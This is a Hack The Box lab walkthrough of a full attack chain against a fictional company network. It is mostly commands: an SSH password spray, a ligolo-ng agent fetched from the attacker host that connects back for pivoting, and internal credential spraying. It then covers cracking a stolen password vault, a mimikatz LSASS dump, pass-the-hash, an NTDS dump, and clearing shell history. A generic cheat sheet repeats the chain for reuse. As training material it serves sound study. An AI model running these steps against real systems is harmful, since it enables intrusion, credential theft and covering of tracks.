# DMZ Foothold → Pivot → Credential Chain → DC Compromise
**Scenario:** HTB Password Attacks Final Assessment (Nexura LLC)  
**Goal:** Start from a single credential clue, gain a foothold on `DMZ01`, pivot to the internal subnet, escalate via credential discovery/reuse, and dump `Administrator`’s hash from `DC01`.

---

## Flow
1) **Username generation** → **Password spray (SSH)** → **Foothold on DMZ01**
2) **Drop ligolo-ng** → **Pivot 172.16.119.0/24**
3) **Spray RDP/WinRM/SMB** with discovered creds → **RDP to JUMP01**
4) **Hunt shares with Snaffler** → **Pull `.psafe3`** → **Crack with hashcat**
5) **New creds** → **Admin RDP on JUMP01** → **Mimikatz LSASS** → **Get user NTLM**
6) **Pass-the-Hash to DC01** → **`--ntds` dump** → **Administrator hash**
7) **Housekeeping** (remove tools, logs, tunnels)

References: username-anarchy, hydra, ligolo-ng, netexec (nxc), xfreerdp, Snaffler, smbclient, hashcat, mimikatz.

---

## Environment & OPSEC
- **Attack host:** `10.10.15.81` (Kali/Parrot).  
- **Targets:**  
  - External: `DMZ01` – `10.129.234.116` (also `172.16.119.13`)  
  - Internal: `JUMP01` – `172.16.119.7`, `FILE01` – `172.16.119.10`, `DC01` – `172.16.119.11`  
- Work from a **staging dir** (easy clean-up). Keep a **loot/** folder for creds, tickets, and dumps.  fileciteturn0file0

---

## Recon and Foothold (SSH)
### Port scan (external)
```bash
nmap -sC -sV -oN nmap/DMZ01 10.129.234.116
# Expect SSH/22 on Ubuntu/OpenSSH
```
Result establishes SSH as the entry point.

### Username generation + Spray
```bash
# Username candidates
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy "Betty Jayde" > user.list

# Single-password spray
hydra -L user.list -p 'Texas123!@#' ssh://10.129.234.116
```
Look for a valid pair like `jbetty:Texas123!@#`. Then:
```bash
ssh jbetty@10.129.234.116
```
Tip: throttle if needed (`-t 4`).

### Immediate local triage
```bash
# Fast wins
grep -riE 'pass|cred|key|pw|secret' /home/ 2>/dev/null
# Or inspect bash history quickly
sed -n '1,200p' ~/.bash_history
```
Expect a one-liner revealing **sshpass** to `FILE01` (e.g., `hwilliam:dealer-screwed-gym1`).

---

## Pivoting via ligolo-ng
### Prep proxy & agent
```bash
# On attacker
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
sudo ./proxy -selfcert

# Serve agent
python3 -m http.server 8000

# On DMZ01
wget http://10.10.15.81:8000/agent
chmod +x agent
./agent -connect 10.10.15.81:11601 --ignore-cert
```
In the proxy console:
```text
session            # select DMZ01 agent
autoroute          # add 172.16.119.13/24, create iface, start tunnel
```
You now reach the internal subnet from attacker host.

---

## Spray Internal Services
Create a quick host list and test the found creds:
```bash
cat > hosts <<'EOF'
172.16.119.13
172.16.119.7
172.16.119.10
172.16.119.11
EOF

# RDP (NetExec)
nxc rdp hosts -u hwilliam -p 'dealer-screwed-gym1'
# Expect success on JUMP01 at least
```
RDP in and **share a working folder**:
```bash
xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' \
  /dynamic-resolution /drive:linux,.
```
---

## Share Hunting (Snaffler) Vault Pull
### Enumerate shares
```bash
nxc smb hosts -u hwilliam -p 'dealer-screwed-gym1' --shares
# FILE01 exposes HR/PRIVATE/TRANSFER (interesting)
```
### Run Snaffler from JUMP01
Copy Snaffler into the shared `linux` drive, then on JUMP01:
```cmd
C:\Users\hwilliam\Desktop>Snaffler.exe -u -s -n FILE01.nexura.htb
```
Look for **Password Managers**, keywords like **pass**; note `.psafe3` hits.

### Pull the vault via SMB
```bash
smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR' -c 'cd Archive; get Employee-Passwords_OLD.psafe3'
```
Crack the Password Safe v3 vault:
```bash
# Mode 5200 = Password Safe v3
hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz
# Expect: michaeljackson
```
Open the vault on FILE01 or offline to extract creds, e.g.:
- `bdavid:caramel-cigars-reply1`
- `stom:fails-nibble-disturb4` 

---

## Priv Esc via Admin Session → LSASS Dump
### Check admin access
```bash
nxc winrm hosts -u bdavid -p 'caramel-cigars-reply1'
nxc rdp 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'
# Expect admin on JUMP01
```
### Mimikatz on JUMP01
Copy `mimikatz.exe` via the `linux` drive; run elevated CMD:
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
Extract **NTLM** for `stom` (e.g., `21ea958524cfd9a7791737f8d2f764fa`).

---

## DC Compromise (Pass-the-Hash, NTDS)
### Spray the NTLM hash
```bash
nxc smb hosts -u stom -H 21ea958524cfd9a7791737f8d2f764fa
# Should pwn FILE01 and DC01
```
### NTDS dump on DC01
```bash
nxc smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa \
  --ntds --user Administrator
# Look for Administrator NT hash (e.g., 36e09e1e6ade94d63fbcab5e5b8d6d23)
```
Mission complete.

---

## Housekeeping
- Kill ligolo session; remove `agent` from DMZ01, delete temp dirs.  
- Clear RDP transfer folders, delete Snaffler/Mimikatz binaries.  
- Consider clearing shell history on Linux foothold.

---

## Quick Reference
```bash
# Username & spray
./username-anarchy "First Last" > user.list
hydra -L user.list -p 'Password!' ssh://TARGET

# Pivot
sudo ./proxy -selfcert
python3 -m http.server 8000
./agent -connect ATTACKER:11601 --ignore-cert
# inside proxy: session → autoroute → start

# Internal spray
nxc rdp hosts -u user -p 'pass'
nxc smb hosts -u user -p 'pass' --shares
xfreerdp /v:IP /u:user /p:'pass' /drive:linux,.

# Share loot
smbclient -U DOM\\user '\\IP\SHARE' -c 'cd dir; get file'

# Password Safe
hashcat -m 5200 db.psafe3 /usr/share/wordlists/rockyou.txt.gz

# LSASS / Creds
# (Windows) mimikatz privilege::debug ; sekurlsa::logonpasswords

# Pass-the-Hash & NTDS
nxc smb DC -u user -H NTLM --ntds --user Administrator
```

---

## Tool Links
- username-anarchy — https://github.com/urbanadventurer/username-anarchy
- hydra — https://github.com/vanhauser-thc/thc-hydra
- ligolo-ng — https://github.com/nicocha30/ligolo-ng
- NetExec (nxc) — https://github.com/Pennyw0rth/NetExec
- xfreerdp — https://github.com/FreeRDP/FreeRDP
- Snaffler — https://github.com/SnaffCon/Snaffler
- Hashcat — https://hashcat.net/hashcat/
- mimikatz — https://github.com/gentilkiwi/mimikatz
- (Preview) impacket-ntlmrelayx — https://github.com/fortra/impacket
- (Preview) PKINITtools — https://github.com/dirkjanm/PKINITtools
- (Preview) pywhisker — https://github.com/ShutdownRepo/pywhisker
